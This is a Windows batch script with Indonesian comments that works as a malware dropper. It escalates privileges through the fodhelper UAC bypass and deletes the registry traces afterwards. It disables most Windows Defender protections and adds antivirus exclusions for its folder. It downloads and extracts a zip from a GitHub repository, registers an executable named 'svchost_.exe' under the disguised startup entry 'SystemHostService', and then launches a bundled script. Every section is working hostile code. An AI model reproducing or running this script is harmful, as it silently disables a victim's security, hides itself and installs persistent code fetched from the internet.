@echo off
:: Wajib dijalankan sebagai Administrator hanya sekali untuk bypass UAC

:: ============ VARIABEL ============
set "folderPath=C:\ProgramData\AppData"
set "zipName=XMASTERTES.zip"
set "extractFolder=XMASTERTES-main"
set "fullPath=%folderPath%\%extractFolder%"
set "exePath=%fullPath%\svchost_.exe"
set "tempBypassPath=%temp%\BypassUAC.bat"
set "currentDir=%~dp0"

:: ============ CEK UAC & BYPASS FODHELPER ============
:: Jika belum elevated, lakukan bypass via fodhelper
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Bypassing UAC using fodhelper...

    (
        echo @echo off
        echo reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2^>^&1
        echo reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%~f0\"" >nul
        echo reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d "" >nul
        echo start "" "C:\Windows\System32\fodhelper.exe"
        echo exit
    ) > "%tempBypassPath%"

    call "%tempBypassPath%"
    exit /b
)

:: Setelah elevate, hapus jejak registry bypass
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
del /f /q "%tempBypassPath%" >nul 2>&1

echo [*] Script berjalan sebagai Administrator...

:: ============ DETEKSI WINDOWS ============
ver | findstr /i "10.0." >nul
if %errorlevel%==0 (
    goto Windows10
) else (
    goto Windows11
)

:Windows10
echo [*] Windows 10 terdeteksi

:: ===== NONAKTIFKAN PROTEKSI DEFENDER (WIN10) =====
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -MAPSReporting 0"
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"

goto DefenderExclusion

:Windows11
echo [*] Windows 11 terdeteksi

:: ===== NONAKTIFKAN PROTEKSI DEFENDER (WIN11) SEBISA MUNGKIN =====
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
powershell -Command "Set-MpPreference -DisableScriptScanning $true"
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
powershell -Command "Set-MpPreference -MAPSReporting 0"

:DefenderExclusion
:: ===== TAMBAHKAN FOLDER KE EXCLUSION DEFENDER =====
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
powershell -Command "Add-MpPreference -ExclusionPath '%fullPath%'"

:: ============ BUAT FOLDER ============
mkdir "%folderPath%" 2>nul

:: ============ DOWNLOAD ZIP ============
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile '%folderPath%\%zipName%'"

:: ============ EKSTRAK ZIP ============
powershell -nologo -noprofile -executionpolicy bypass -command ^
"Expand-Archive -Path '%folderPath%\%zipName%' -DestinationPath '%folderPath%' -Force"

:: ============ TAMBAH KE STARTUP ============
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHostService" /t REG_SZ /d "%exePath%" /f

:: ============ JALANKAN DAN BUKA FOLDER ============
start "" explorer "%fullPath%"
if exist "%fullPath%\RunScript.bat" (
    start "" "%fullPath%\RunScript.bat"
)

exit
